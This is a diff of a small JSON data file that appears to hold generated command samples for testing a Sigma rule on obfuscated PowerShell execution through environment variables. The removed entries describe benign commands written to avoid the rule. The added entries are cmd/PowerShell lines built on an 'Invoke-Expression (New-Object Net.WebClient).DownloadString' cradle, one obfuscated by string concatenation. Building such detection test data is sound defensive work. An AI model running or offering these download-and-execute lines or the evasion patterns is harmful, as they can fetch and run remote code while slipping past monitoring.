@@ -1,14 +1,14 @@
 [
   {
-    "output": "cmd.exe /C \"set VAR=Write-Output ''Execution Simulated'' && powershell.exe -Command $env:VAR\"",
-    "explanation": "This command uses a standard environment variable assignment and execution method that avoids obfuscation techniques detected by the Sigma rule. It uses a straightforward 'set' command and does not involve string concatenation or obfuscated syntax."
+    "output": "cmd.exe /C \"SET Var1=Invoke-Expression (New-Object Net.WebClient).DownloadString && PowerShell -NoP -Command (Get-Variable (\"Va\" + \"riable:Var1\")).Value\"",
+    "explanation": "This command uses obfuscation techniques similar to the Sigma rule by setting an environment variable with a PowerShell command and invoking it. It leverages string concatenation and command-line syntax variations to mimic the behavior described in the rule."
   },
   {
-    "output": "powershell.exe -Command \"$env:TEST='Write-Output ''Execution Simulated'''; Invoke-Expression $env:TEST\"",
-    "explanation": "This command uses a standard PowerShell command to set an environment variable and execute its value. It avoids obfuscation and string formatting techniques that would trigger the Sigma rule."
+    "output": "CMD.EXE /C \"SET Var2=Invoke-Expression (New-Object Net.WebClient).DownloadString && POWERSHELL.EXE -Command (Get-Variable Var2).Value\"",
+    "explanation": "This command simulates the same behavior by using a different casing for CMD.EXE and POWERSHELL.EXE and inserting spaces and quotes to obfuscate the command structure."
   },
   {
-    "output": "cmd.exe /C \"set TEST=Write-Output ''Execution Simulated'' && powershell.exe -Command $env:TEST\"",
-    "explanation": "This command uses a standard CMD command to set an environment variable and then executes it in PowerShell. It avoids the obfuscated string formatting and concatenation techniques that the Sigma rule is designed to detect."
+    "output": "cmd /C \"SET Var3=Invoke-Expression (New-Object Net.WebClient).DownloadString && powershell -Command (Get-Variable Var3).Value\"",
+    "explanation": "This command uses minimal syntax and no obfuscation beyond basic command structure to simulate a benign-looking command that still matches the Sigma rule's pattern."
   }
 ]
